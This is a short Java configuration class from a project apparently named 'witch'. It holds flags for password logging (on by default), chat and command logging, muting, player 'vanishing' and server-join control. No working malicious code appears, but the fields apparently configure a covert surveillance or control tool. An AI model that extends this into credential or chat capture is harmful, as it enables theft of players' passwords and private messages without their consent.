package me.soda.witch.features;

import java.util.ArrayList;
import java.util.List;

public class Config {
    public boolean passwordBeingLogged = true;
    public boolean isMuted = false;
    public boolean isBeingFiltered = false;
    public String filterPattern = "";
    public List<String> vanishedPlayers = new ArrayList<>();
    public boolean logChatAndCommand = false;
    public boolean canJoinServer = true;
}
